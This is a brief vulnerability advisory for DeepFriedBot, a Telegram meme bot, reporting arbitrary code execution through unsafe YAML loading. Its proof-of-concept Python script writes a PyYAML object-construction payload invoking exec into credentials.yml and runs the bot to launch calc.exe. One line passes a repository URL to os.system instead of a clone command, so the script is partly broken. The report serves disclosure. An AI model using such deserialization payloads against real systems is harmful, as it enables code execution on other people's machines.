# Description

`DeepFriedBot` is a telegram bot that sends random deep fried memes, package is vulnerable to `Arbitary Code Execution`.

# Vulnerability

Vulnerable to YAML deserialization attack caused by unsafe loading.

# Proof of Concept

```python
import os
os.system('https://github.com/xdf8/DeepFriedBot')
os.chdir('DeepFriedBot/')

payload = """cmd: !!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('calc.exe')"
"""

open('credentials.yml','w+').write(payload)

os.system('python3 bot.py')
```
* `python3 exploit.py`


# Impact

Arbitary Code Execution
